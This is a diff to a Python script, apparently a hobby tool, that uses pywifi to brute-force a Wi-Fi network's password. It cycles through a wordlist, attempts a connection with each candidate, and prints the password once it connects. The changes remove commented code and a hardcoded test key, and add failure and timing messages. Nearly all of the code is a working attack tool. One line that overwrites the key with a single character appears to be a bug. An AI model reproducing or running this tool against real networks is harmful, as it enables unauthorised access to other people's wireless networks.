@@ -60,8 +60,6 @@ def bruteforce():
               "try again using 'sudo'.\n")
         sys.exit()
     passwords = passwords_list()
-#    wifi = pywifi.PyWiFi()
-#    interfaces = wifi.interfaces()[0]
 
     wifi = pywifi.PyWiFi()
     interface = wifi.interfaces()[0]
@@ -72,7 +70,6 @@ def bruteforce():
     start_time = time.time()
     profile = profile_setup(wifi_name)
     for password in passwords:
-        # profile.key = "rba5829qaBdk"
         profile.key = password
         profile.key = password[0]
         interface.remove_all_network_profiles()
@@ -88,10 +85,14 @@ def bruteforce():
             print("Connected ! password for {} is {}\n".format(profile.ssid,
                                                                profile.key))
             print("Execution took {} seconds.".format(time.time()-start_time))
-           # interface.disconnect()
+            interface.disconnect()
             exit()
         else:
-            print(profile.key)
+            print("{} is not the password\n".format(profile.key))
+    print("No passwords matched :(\n")
+    print("Execution took {} seconds.".format(time.time() - start_time))
+    sys.exit()
+
 
 
 f = ''
@@ -99,7 +100,6 @@ parser = argparse.ArgumentParser()
 parser.add_argument("file")
 args = parser.parse_args()
 f = args.file
-print(f)
 if not os.path.exists(f):
     print(f)
     print("file does not exists.")
